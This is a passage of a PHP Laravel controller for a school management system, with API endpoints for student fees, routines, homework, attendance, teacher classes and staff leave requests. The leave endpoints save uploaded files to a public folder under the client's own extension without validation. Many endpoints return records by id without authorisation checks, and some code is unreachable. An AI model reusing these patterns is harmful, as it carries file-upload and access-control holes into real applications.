            ->where('aramisc_fees_assigns.student_id', $student->id)

            ->get();
        $i = 0;
        return $fees_assigneds2;
        foreach ($fees_assigneds2 as $row) {
            $d[$i]['fees_name'] = $row->name;
            $d[$i]['due_date'] = $row->due_date;
            $d[$i]['amount'] = $row->amount;
            $d[$i]['paid'] = DB::table('aramisc_fees_payments')->where('fees_type_id', $row->fees_type_id)->sum('amount');
            $d[$i]['fine'] = DB::table('aramisc_fees_payments')->where('fees_type_id', $row->fees_type_id)->sum('fine');
            $d[$i]['discount_amount'] = DB::table('aramisc_fees_payments')->where('fees_type_id', $row->fees_type_id)->sum('discount_amount');
            $d[$i]['balance'] = ((float) $d[$i]['amount'] + (float) $d[$i]['fine'])  - ((float) $d[$i]['paid'] + (float) $d[$i]['discount_amount']);
            $i++;
        }

        $fees_discounts = AramiscFeesAssignDiscount::where('student_id', $id)->get();

        $applied_discount = [];
        foreach ($fees_discounts as $fees_discount) {
            $fees_payment = AramiscFeesPayment::select('fees_discount_id')->where('fees_discount_id', $fees_discount->id)->first();
            if (isset($fees_payment->fees_discount_id)) {
                $applied_discount[] = $fees_payment->fees_discount_id;
            }
        }


        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];

            $data['fees'] = $d;
            return ApiBaseMethod::sendResponse($fees_assigneds2, null);
        }

        return view('backEnd.feesCollection.collect_fees_student_wise', compact('student', 'fees_assigneds', 'fees_discounts', 'applied_discount'));
    }
    public function saas_collectFeesChildApi(Request $request,$school_id, $id)
    {

        $student = AramiscStudent::where('id', $id)->where('school_id',$school_id)->first();
        $fees_assigneds = AramiscFeesAssign::where('student_id', $id)->orderBy('id', 'desc')->where('school_id',$school_id)->get();

        $fees_assigneds2 = DB::table('aramisc_fees_assigns')
            ->select('aramisc_fees_types.id as fees_type_id', 'aramisc_fees_types.name', 'aramisc_fees_masters.date as due_date', 'aramisc_fees_masters.amount as amount')
            ->join('aramisc_fees_masters', 'aramisc_fees_masters.id', '=', 'aramisc_fees_assigns.fees_master_id')
            ->join('aramisc_fees_types', 'aramisc_fees_types.id', '=', 'aramisc_fees_masters.fees_type_id')
            ->join('aramisc_fees_payments', 'aramisc_fees_payments.fees_type_id', '=', 'aramisc_fees_masters.fees_type_id')
            ->where('aramisc_fees_assigns.student_id', @$student->id)

            ->where('aramisc_fees_assigns.school_id',$school_id)->get();
        $i = 0;
        return $fees_assigneds2;
        foreach ($fees_assigneds2 as $row) {
            $d[$i]['fees_name'] = $row->name;
            $d[$i]['due_date'] = $row->due_date;
            $d[$i]['amount'] = $row->amount;
            $d[$i]['paid'] = DB::table('aramisc_fees_payments')->where('fees_type_id', $row->fees_type_id)->where('school_id',$school_id)->sum('amount');
            $d[$i]['fine'] = DB::table('aramisc_fees_payments')->where('fees_type_id', $row->fees_type_id)->where('school_id',$school_id)->sum('fine');
            $d[$i]['discount_amount'] = DB::table('aramisc_fees_payments')->where('fees_type_id', $row->fees_type_id)->where('school_id',$school_id)->sum('discount_amount');
            $d[$i]['balance'] = ((float) $d[$i]['amount'] + (float) $d[$i]['fine'])  - ((float) $d[$i]['paid'] + (float) $d[$i]['discount_amount']);
            $i++;
        }

        $fees_discounts = AramiscFeesAssignDiscount::where('student_id', $id)->get();

        $applied_discount = [];
        foreach ($fees_discounts as $fees_discount) {
            $fees_payment = AramiscFeesPayment::select('fees_discount_id')->where('fees_discount_id', $fees_discount->id)->first();
            if (isset($fees_payment->fees_discount_id)) {
                $applied_discount[] = $fees_payment->fees_discount_id;
            }
        }


        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];

            $data['fees'] = $d;
            return ApiBaseMethod::sendResponse($fees_assigneds2, null);
        }

        return view('backEnd.feesCollection.collect_fees_student_wise', compact('student', 'fees_assigneds', 'fees_discounts', 'applied_discount'));
    }
    public function classRoutineApi(Request $request, $id)
    {

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $user_id = $id;
        } else {
            $user = Auth::user();

            if ($user) {
                $user_id = $user->id;
            } else {
                $user_id = $request->user_id;
            }
        }

        $student_detail = AramiscStudent::where('id', $id)->first();

        $class_id = $student_detail->class_id;
        $section_id = $student_detail->section_id;

        $aramisc_weekends = AramiscWeekend::where('school_id', Auth::user()->school_id)->orderBy('order', 'ASC')->where('active_status', 1)->get();
        $class_times = AramiscClassTime::where('type', 'class')->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['student_detail'] = $student_detail->toArray();


            $weekenD = AramiscWeekend::where('school_id', Auth::user()->school_id)->get();
            foreach ($weekenD as $row) {
                $data[$row->name] = DB::table('aramisc_class_routine_updates')
                    ->select('aramisc_class_times.period', 'aramisc_class_times.start_time', 'aramisc_class_times.end_time', 'aramisc_subjects.subject_name', 'aramisc_class_rooms.room_no')
                    ->join('aramisc_classes', 'aramisc_classes.id', '=', 'aramisc_class_routine_updates.class_id')
                    ->join('aramisc_sections', 'aramisc_sections.id', '=', 'aramisc_class_routine_updates.section_id')
                    ->join('aramisc_class_times', 'aramisc_class_times.id', '=', 'aramisc_class_routine_updates.class_period_id')
                    ->join('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_class_routine_updates.subject_id')
                    ->join('aramisc_class_rooms', 'aramisc_class_rooms.id', '=', 'aramisc_class_routine_updates.room_id')

                    ->where([
                        ['aramisc_class_routine_updates.class_id', $class_id], ['aramisc_class_routine_updates.section_id', $section_id], ['aramisc_class_routine_updates.day', $row->id],
                    ])->get();
            }

            return ApiBaseMethod::sendResponse($data, null);
        }

    }
    public function saas_classRoutineApi(Request $request,$school_id, $id)
    {

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $user_id = $id;
        } else {
            $user = Auth::user();

            if ($user) {
                $user_id = $user->id;
            } else {
                $user_id = $request->user_id;
            }
        }

        $student_detail = AramiscStudent::where('id', $id)->where('school_id',$school_id)->first();
        $class_id = @$student_detail->class_id;
        $section_id = @$student_detail->section_id;

        $aramisc_weekends = AramiscWeekend::where('school_id', Auth::user()->school_id)->orderBy('order', 'ASC')->where('active_status', 1)->get();
        $class_times = AramiscClassTime::where('type', 'class')->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $data['student_detail'] = @$student_detail->toArray();


            $weekenD = AramiscWeekend::where('school_id', Auth::user()->school_id)->get();
            foreach ($weekenD as $row) {
                $data[$row->name] = DB::table('aramisc_class_routine_updates')
                    ->select('aramisc_class_times.period', 'aramisc_class_times.start_time', 'aramisc_class_times.end_time', 'aramisc_subjects.subject_name', 'aramisc_class_rooms.room_no')
                    ->join('aramisc_classes', 'aramisc_classes.id', '=', 'aramisc_class_routine_updates.class_id')
                    ->join('aramisc_sections', 'aramisc_sections.id', '=', 'aramisc_class_routine_updates.section_id')
                    ->join('aramisc_class_times', 'aramisc_class_times.id', '=', 'aramisc_class_routine_updates.class_period_id')
                    ->join('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_class_routine_updates.subject_id')
                    ->join('aramisc_class_rooms', 'aramisc_class_rooms.id', '=', 'aramisc_class_routine_updates.room_id')

                    ->where([
                        ['aramisc_class_routine_updates.class_id', $class_id], ['aramisc_class_routine_updates.section_id', $section_id], ['aramisc_class_routine_updates.day', $row->id],
                    ])->where('aramisc_class_routine_updates.school_id',$school_id)->get();
            }

            return ApiBaseMethod::sendResponse($data, null);
        }

    }
    public function childHomework(Request $request, $id)
    {

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $student_detail = AramiscStudent::where('id', $id)->first();

            $class_id = $student_detail->class->id;
            $subject_list = AramiscAssignSubject::where([['class_id', $class_id], ['section_id', $student_detail->section_id]])->get();

            $i = 0;
            foreach ($subject_list as $subject) {
                $homework_subject_list[$subject->subject->subject_name] = $subject->subject->subject_name;
                $allList[$subject->subject->subject_name] =
                    DB::table('aramisc_homeworks')
                        ->select('aramisc_homeworks.description', 'aramisc_subjects.subject_name', 'aramisc_homeworks.homework_date', 'aramisc_homeworks.submission_date', 'aramisc_homeworks.evaluation_date', 'aramisc_homeworks.file', 'aramisc_homeworks.marks', 'aramisc_homework_students.complete_status as status')
                        ->leftjoin('aramisc_homework_students', 'aramisc_homework_students.homework_id', '=', 'aramisc_homeworks.id')
                        ->leftjoin('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_homeworks.subject_id')
                        ->where('class_id', $student_detail->class_id)->where('section_id', $student_detail->section_id)->where('subject_id', $subject->subject_id)->get();
            }

            $homeworkLists = AramiscHomework::where('class_id', $student_detail->class_id)->where('section_id', $student_detail->section_id)->get();
        }
        $data = [];

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            foreach ($allList as $r) {
                foreach ($r as $s) {
                    $data[] = $s;
                }
            }
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function saas_childHomework(Request $request,$school_id, $id)
    {

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $student_detail = AramiscStudent::where('id', $id)->where('school_id',$school_id)->first();

            $class_id = @$student_detail->class->id;
            $subject_list = AramiscAssignSubject::where([['class_id', $class_id], ['section_id', @$student_detail->section_id]])->where('school_id',$school_id)->get();

            $i = 0;
            foreach ($subject_list as $subject) {
                $homework_subject_list[$subject->subject->subject_name] = $subject->subject->subject_name;
                $allList[$subject->subject->subject_name] =
                    DB::table('aramisc_homeworks')
                        ->select('aramisc_homeworks.description', 'aramisc_subjects.subject_name', 'aramisc_homeworks.homework_date', 'aramisc_homeworks.submission_date', 'aramisc_homeworks.evaluation_date', 'aramisc_homeworks.file', 'aramisc_homeworks.marks', 'aramisc_homework_students.complete_status as status')
                        ->leftjoin('aramisc_homework_students', 'aramisc_homework_students.homework_id', '=', 'aramisc_homeworks.id')
                        ->leftjoin('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_homeworks.subject_id')
                        ->where('class_id', @$student_detail->class_id)->where('section_id', @$student_detail->section_id)->where('subject_id', $subject->subject_id)->where('aramisc_homeworks.school_id',$school_id)->get();
            }

            $homeworkLists = AramiscHomework::where('class_id', @$student_detail->class_id)->where('section_id', @$student_detail->section_id)->where('school_id',$school_id)->get();
        }
        $data = [];

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            foreach ($allList as $r) {
                foreach ($r as $s) {
                    $data[] = $s;
                }
            }
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function childAttendanceAPI(Request $request, $id)
    {

        $input = $request->all();

        $validator = Validator::make($input, [
            'month' => "required",
            'year' => "required",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()->withErrors($validator)->withInput();
        }

        $student_detail = AramiscStudent::where('id', $id)->first();

        $year = $request->year;
        $month = $request->month;
        if ($month < 10) {
            $month = '0' . $month;
        }
        $current_day = date('d');

        $days = cal_days_in_month(CAL_GREGORIAN, $month, $request->year);
        $days2 = cal_days_in_month(CAL_GREGORIAN, $month - 1, $request->year);
        $previous_month = $month - 1;
        $previous_date = $year . '-' . $previous_month . '-' . $days2;



        $previousMonthDetails['date'] = $previous_date;
        $previousMonthDetails['day'] = $days2;
        $previousMonthDetails['week_name'] = date('D', strtotime($previous_date));


        $attendances = AramiscStudentAttendance::where('student_id', $student_detail->id)
            ->where('attendance_date', 'like', '%' . $request->year . '-' . $month . '%')
            ->select('attendance_type', 'attendance_date')
            ->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data['attendances'] = $attendances;
            $data['previousMonthDetails'] = $previousMonthDetails;
            $data['days'] = $days;
            $data['year'] = $year;
            $data['month'] = $month;
            $data['current_day'] = $current_day;
            $data['status'] = 'Present: P, Late: L, Absent: A, Holiday: H, Half Day: F';
            return ApiBaseMethod::sendResponse($data, null);
        }

    }
    public function saas_childAttendanceAPI(Request $request,$school_id, $id)
    {

        $input = $request->all();

        $validator = Validator::make($input, [
            'month' => "required",
            'year' => "required",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()->withErrors($validator)->withInput();
        }

        $student_detail = AramiscStudent::where('id', $id)->where('school_id',$school_id)->first();

        $year = $request->year;
        $month = $request->month;
        if ($month < 10) {
            $month = '0' . $month;
        }
        $current_day = date('d');

        $days = cal_days_in_month(CAL_GREGORIAN, $month, $request->year);
        $days2 = cal_days_in_month(CAL_GREGORIAN, $month - 1, $request->year);
        $previous_month = $month - 1;
        $previous_date = $year . '-' . $previous_month . '-' . $days2;



        $previousMonthDetails['date'] = $previous_date;
        $previousMonthDetails['day'] = $days2;
        $previousMonthDetails['week_name'] = date('D', strtotime($previous_date));


        $attendances = AramiscStudentAttendance::where('student_id', @$student_detail->id)
            ->where('attendance_date', 'like', '%' . $request->year . '-' . $month . '%')
            ->select('attendance_type', 'attendance_date')
            ->where('school_id',$school_id)->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data['attendances'] = $attendances;
            $data['previousMonthDetails'] = $previousMonthDetails;
            $data['days'] = $days;
            $data['year'] = $year;
            $data['month'] = $month;
            $data['current_day'] = $current_day;
            $data['status'] = 'Present: P, Late: L, Absent: A, Holiday: H, Half Day: F';
            return ApiBaseMethod::sendResponse($data, null);
        }

    }

    public function aboutApi(request $request)
    {

        $about = DB::table('aramisc_general_settings')
            ->join('aramisc_languages', 'aramisc_general_settings.language_id', '=', 'aramisc_languages.id')
            ->join('aramisc_academic_years', 'aramisc_general_settings.session_id', '=', 'aramisc_academic_years.id')
            ->join('aramisc_about_pages', 'aramisc_general_settings.school_id', '=', 'aramisc_about_pages.school_id')
            ->select('main_description', 'school_name', 'site_title', 'school_code', 'address', 'phone', 'email', 'logo', 'aramisc_languages.language_name', 'year as session', 'copyright_text')
            ->first();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {

            return ApiBaseMethod::sendResponse($about, null);
        }
    }
    public function saas_aboutApi(request $request, $school_id)
    {

        $about = DB::table('aramisc_general_settings')
            ->join('aramisc_languages', 'aramisc_general_settings.language_id', '=', 'aramisc_languages.id')
            ->join('aramisc_academic_years', 'aramisc_general_settings.session_id', '=', 'aramisc_academic_years.id')
            ->join('aramisc_about_pages', 'aramisc_general_settings.school_id', '=', 'aramisc_about_pages.school_id')
            ->select('main_description', 'school_name', 'site_title', 'school_code', 'address', 'phone', 'email', 'logo', 'aramisc_languages.language_name', 'year as session', 'copyright_text')
            ->where('aramisc_general_settings.school_id',$school_id)->first();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {

            return ApiBaseMethod::sendResponse($about, null);
        }
    }



    public function classSection(Request $request, $id)
    {

        $teacher = DB::table('aramisc_staffs')
            ->where('user_id', '=', $id)
            ->first();
        $teacher_id = $teacher->id;

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $teacher_classes = DB::table('aramisc_assign_subjects')
                ->join('aramisc_classes', 'aramisc_classes.id', '=', 'aramisc_assign_subjects.class_id')
                ->join('aramisc_sections', 'aramisc_sections.id', '=', 'aramisc_assign_subjects.section_id')
                ->distinct('class_id')

                ->where('teacher_id', $teacher_id)
                ->get();


            foreach ($teacher_classes as $class) {
                $data[$class->class_name] = DB::table('aramisc_assign_subjects')
                    ->join('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_assign_subjects.subject_id')
                    ->join('aramisc_sections', 'aramisc_sections.id', '=', 'aramisc_assign_subjects.section_id')
                    ->select('section_name', 'subject_name')
                    ->distinct('section_id')
                    ->where([
                        ['aramisc_assign_subjects.class_id', $class->id],
                        ['aramisc_assign_subjects.teacher_id', $teacher_id],
                    ])->get();
            }


            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function saas_classSection(Request $request,$school_id, $id)
    {

        $teacher = DB::table('aramisc_staffs')
            ->where('user_id', '=', $id)
            ->where('school_id',$school_id)->first();
        $teacher_id = @$teacher->id;

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            $teacher_classes = DB::table('aramisc_assign_subjects')
                ->join('aramisc_classes', 'aramisc_classes.id', '=', 'aramisc_assign_subjects.class_id')
                ->join('aramisc_sections', 'aramisc_sections.id', '=', 'aramisc_assign_subjects.section_id')
                ->distinct('class_id')

                ->where('teacher_id', $teacher_id)
                ->where('aramisc_assign_subjects.school_id',$school_id)->get();


            foreach ($teacher_classes as $class) {
                $data[$class->class_name] = DB::table('aramisc_assign_subjects')
                    ->join('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_assign_subjects.subject_id')
                    ->join('aramisc_sections', 'aramisc_sections.id', '=', 'aramisc_assign_subjects.section_id')
                    ->select('section_name', 'subject_name')
                    ->distinct('section_id')
                    ->where([
                        ['aramisc_assign_subjects.class_id', $class->id],
                        ['aramisc_assign_subjects.teacher_id', $teacher_id],
                    ])->where('aramisc_assign_subjects.school_id',$school_id)->get();
            }

            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function subjectsName(Request $request, $id)
    {
        $teacher = DB::table('aramisc_staffs')
            ->where('user_id', '=', $id)
            ->first();
        $teacher_id = $teacher->id;

        $subjectsName = DB::table('aramisc_assign_subjects')
            ->join('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_assign_subjects.subject_id')
            ->select('subject_id', 'subject_name', 'subject_code', 'subject_type')
            ->where('aramisc_assign_subjects.active_status', 1)
            ->where('teacher_id', $teacher_id)
            ->distinct('subject_id')
            ->get();
        $subject_type = 'T=Theory, P=Practical';
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data['subjectsName'] = $subjectsName->toArray();
            $data['subject_type'] = $subject_type;
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function saas_subjectsName(Request $request,$school_id, $id)
    {
        $teacher = DB::table('aramisc_staffs')
            ->where('user_id', '=', $id)
            ->where('school_id',$school_id)->first();
        $teacher_id = @$teacher->id;

        $subjectsName = DB::table('aramisc_assign_subjects')
            ->join('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_assign_subjects.subject_id')
            ->select('subject_id', 'subject_name', 'subject_code', 'subject_type')
            ->where('aramisc_assign_subjects.active_status', 1)
            ->where('teacher_id', $teacher_id)
            ->distinct('subject_id')
            ->where('aramisc_assign_subjects.school_id',$school_id)->get();
        $subject_type = 'T=Theory, P=Practical';
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data['subjectsName'] = $subjectsName->toArray();
            $data['subject_type'] = $subject_type;
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function teacherClassList(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'id' => "required",

        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        $teacher = DB::table('aramisc_staffs')
            ->where('user_id', '=', $request->id)
            ->first();
        $teacher_id = $teacher->id;



        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            if ($teacher->role_id==1 || $teacher->role_id==5) {
                $teacher_classes = DB::table('aramisc_classes')
                    ->where('active_status', 1)
                    ->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                    ->where('school_id',$teacher->school_id )
                    ->get();
            } else {
                $teacher_classes = DB::table('aramisc_assign_subjects')
                    ->join('aramisc_classes', 'aramisc_classes.id', '=', 'aramisc_assign_subjects.class_id')
                    ->join('aramisc_sections', 'aramisc_sections.id', '=', 'aramisc_assign_subjects.section_id')
                    ->distinct('class_id')
                    ->select('class_id', 'class_name')
                    ->where('teacher_id', $teacher_id)
                    ->where('aramisc_classes.academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())
                    ->get();
            }


            $data['teacher_classes'] = $teacher_classes->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function saas_teacherClassList(Request $request, $school_id)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'id' => "required",

        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        $teacher = AramiscStaff::withOutGlobalScope(ActiveStatusSchoolScope::class)->where('user_id', '=', $request->id)->first();
        $teacher_id = $teacher->id;
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            if ($teacher->role_id==1 || $teacher->role_id==5) {
                $teacher_classes = DB::table('aramisc_classes')
                    ->where('active_status', 1)
                    ->where('academic_id', AramiscAcademicYear::API_ACADEMIC_YEAR($school_id))
                    ->where('school_id',$teacher->school_id )
                    ->select('id as class_id', 'class_name')
                    ->get();
            } else {
                $teacher_classes = DB::table('aramisc_assign_subjects')
                    ->join('aramisc_classes', 'aramisc_classes.id', '=', 'aramisc_assign_subjects.class_id')
                    ->join('aramisc_sections', 'aramisc_sections.id', '=', 'aramisc_assign_subjects.section_id')
                    ->distinct('class_id')
                    ->select('class_id', 'class_name')
                    ->where('teacher_id', $teacher_id)
                    ->where('aramisc_classes.academic_id', AramiscAcademicYear::API_ACADEMIC_YEAR($school_id))
                    ->get();
            }
            $data['teacher_classes'] = $teacher_classes->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function teacherSectionList(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'id' => "required",
            'class' => "required",

        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        $teacher = DB::table('aramisc_staffs')
            ->where('user_id', '=', $request->id)
            ->first();
        $teacher_id = $teacher->id;

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];
            if ($teacher->role_id==1 || $teacher->role_id == 5) {
                $teacher_classes = DB::table('aramisc_class_sections')
                    ->join('aramisc_classes', 'aramisc_classes.id', '=', 'aramisc_class_sections.class_id')
                    ->join('aramisc_sections', 'aramisc_sections.id', '=', 'aramisc_class_sections.section_id')
                    ->distinct('section_id')
                    ->select('section_id', 'section_name')
                    ->where('aramisc_class_sections.class_id', $request->class)
                    ->orderby('aramisc_class_sections.section_id','ASC')
                    ->get();
            } else {
                $teacher_classes = DB::table('aramisc_assign_subjects')
                    ->join('aramisc_classes', 'aramisc_classes.id', '=', 'aramisc_assign_subjects.class_id')
                    ->join('aramisc_sections', 'aramisc_sections.id', '=', 'aramisc_assign_subjects.section_id')
                    ->distinct('section_id')
                    ->select('section_id', 'section_name')
                    ->where('teacher_id', $teacher_id)
                    ->where('class_id', $request->class)
                    ->orderby('aramisc_assign_subjects.section_id','ASC')
                    ->get();
            }


            $data['teacher_sections'] = $teacher_classes->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function saas_teacherSectionList(Request $request, $school_id)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'id' => "required",
            'class' => "required",

        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        $teacher = DB::table('aramisc_staffs')
            ->where('user_id', '=', $request->id)
            ->where('school_id',$school_id)->first();
        $teacher_id = @$teacher->id;

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data = [];

            if ($teacher->role_id==1 || $teacher->role_id==5) {
                $teacher_classes = DB::table('aramisc_class_sections')
                    ->join('aramisc_classes', 'aramisc_classes.id', '=', 'aramisc_class_sections.class_id')
                    ->join('aramisc_sections', 'aramisc_sections.id', '=', 'aramisc_class_sections.section_id')
                    ->distinct('section_id')
                    ->select('section_id', 'section_name')
                    ->where('aramisc_class_sections.class_id', $request->class)
                    ->get();
            } else {
                $teacher_classes = DB::table('aramisc_assign_subjects')
                    ->join('aramisc_classes', 'aramisc_classes.id', '=', 'aramisc_assign_subjects.class_id')
                    ->join('aramisc_sections', 'aramisc_sections.id', '=', 'aramisc_assign_subjects.section_id')
                    ->distinct('section_id')
                    ->select('section_id', 'section_name')
                    ->where('teacher_id', $teacher_id)
                    ->where('class_id', $request->class)
                    ->where('aramisc_assign_subjects.school_id',$school_id)->get();
            }

            $data['teacher_sections'] = @$teacher_classes->toArray();
            return ApiBaseMethod::sendResponse($data, null);
        }
    }


    public function leaveTypeList(Request $request)
    {
        try {
            $leave_type = DB::table('aramisc_leave_defines')
                ->where('role_id', 4)
                ->join('aramisc_leave_types', 'aramisc_leave_types.id', '=', 'aramisc_leave_defines.type_id')
                ->where('aramisc_leave_defines.active_status', 1)
                ->select('aramisc_leave_types.id', 'type', 'aramisc_leave_defines.total_days')
                ->distinct('aramisc_leave_defines.type_id')
                ->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($leave_type, null);
            }
        } catch (\Throwable $th) {
            throw $th;
        }

    }
    public function saas_leaveTypeList(Request $request, $school_id)
    {
        $leave_type = DB::table('aramisc_leave_defines')
            ->where('role_id', 4)
            ->join('aramisc_leave_types', 'aramisc_leave_types.id', '=', 'aramisc_leave_defines.type_id')
            ->where('aramisc_leave_defines.active_status', 1)
            ->select('aramisc_leave_types.id', 'type', 'total_days')
            ->distinct('aramisc_leave_defines.type_id')
            ->where('aramisc_leave_defines.school_id',$school_id)->get();

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            return ApiBaseMethod::sendResponse($leave_type, null);
        }
    }
    public function applyLeave(Request $request)
    {


        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'apply_date' => "required",
                'leave_type' => "required",
                'leave_from' => 'required|before_or_equal:leave_to',
                'leave_to' => "required",
                'teacher_id' => "required",
                'reason' => "required",

            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
        }



        $fileName = "";
        if ($request->file('attach_file') != "") {
            $file = $request->file('attach_file');
            $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
            $file->move('public/uploads/leave_request/', $fileName);
            $fileName = 'public/uploads/leave_request/' . $fileName;
        }

        $apply_leave = new AramiscLeaveRequest();
        $apply_leave->staff_id = $request->input('teacher_id');
        $apply_leave->role_id = 4;
        $apply_leave->apply_date = date('Y-m-d');
        $apply_leave->leave_define_id = $request->input('leave_type');
        $apply_leave->type_id = $request->input('leave_type');
        $apply_leave->leave_from = $request->input('leave_from');
        $apply_leave->leave_to = $request->input('leave_to');
        $apply_leave->approve_status = 'P';
        $apply_leave->reason = $request->input('reason');
        if ($fileName != "") {
            $apply_leave->file = $fileName;
        }

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {

            $result = $apply_leave->save();

            return ApiBaseMethod::sendResponse($result, null);
        }
    }
    public function saas_applyLeave(Request $request)
    {


        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'apply_date' => "required",
                'leave_type' => "required",
                'leave_from' => 'required|before_or_equal:leave_to',
                'leave_to' => "required",
                'teacher_id' => "required",
                'reason' => "required",
                'school_id' => "required",

            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
        }



        $fileName = "";
        if ($request->file('attach_file') != "") {
            $file = $request->file('attach_file');
            $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
            $file->move('public/uploads/leave_request/', $fileName);
            $fileName = 'public/uploads/leave_request/' . $fileName;
        }

        $apply_leave = new AramiscLeaveRequest();
        $apply_leave->staff_id = $request->input('teacher_id');
        $apply_leave->role_id = 4;
        $apply_leave->apply_date = date('Y-m-d');
        $apply_leave->leave_define_id = $request->input('leave_type');
        $apply_leave->type_id = $request->input('leave_type');
        $apply_leave->leave_from = $request->input('leave_from');
        $apply_leave->leave_to = $request->input('leave_to');
        $apply_leave->approve_status = 'P';
        $apply_leave->reason = $request->input('reason');
        $apply_leave->school_id = $request->input('school_id');
        if ($fileName != "") {
            $apply_leave->file = $fileName;
        }

        if (ApiBaseMethod::checkUrl($request->fullUrl())) {

            $result = $apply_leave->save();

            return ApiBaseMethod::sendResponse($result, null);
        }
    }
    public function staffLeaveList(Request $request, $id)
    {

        $teacher = AramiscStaff::where('user_id', '=', $id)->first();
        $teacher_id = $teacher->id;

        $leave_list = AramiscLeaveRequest::where('staff_id', '=', $teacher_id)
            ->join('aramisc_leave_defines', 'aramisc_leave_defines.id', '=', 'aramisc_leave_requests.leave_define_id')
            ->join('aramisc_leave_types', 'aramisc_leave_types.id', '=', 'aramisc_leave_defines.type_id')
            ->get();
        $status = 'P for Pending, A for Approve, R for reject';
        $data = [];
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $data['leave_list'] = $leave_list->toArray();
            $data['status'] = $status;
            return ApiBaseMethod::sendResponse($data, null);
        }
    }
    public function saas_staffLeaveList(Request $request,$school_id, $id)
    {

        $teacher = AramiscStaff::where('user_id', '=', $id)->where('school_id',$school_id)->first();
        $teacher_id = @$teacher->id;

        $leave_list = AramiscLeaveRequest::where('staff_id', '=', $teacher_id)
            ->join('aramisc_leave_defines', 'aramisc_leave_defines.id', '=', 'aramisc_leave_requests.leave_define_id')
